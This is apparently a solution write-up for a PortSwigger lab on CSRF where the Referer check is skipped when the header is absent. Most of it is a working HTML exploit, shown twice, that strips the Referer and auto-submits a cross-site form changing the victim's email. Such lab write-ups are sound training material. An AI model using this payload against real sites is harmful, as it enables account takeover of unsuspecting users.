# Lab: CSRF where Referer validation depends on header being present (Practitioner)

**Lab:** [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)

**Task (from PortSwigger):**  
This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

Credentials: `wiener:peter`

## Vulnerability
Referer is validated only if present; dropping it skips the check.

## Solution

```html
<meta name="referrer" content="no-referrer">
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

## Final Exploit Payload
```html
<meta name="referrer" content="no-referrer">
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```
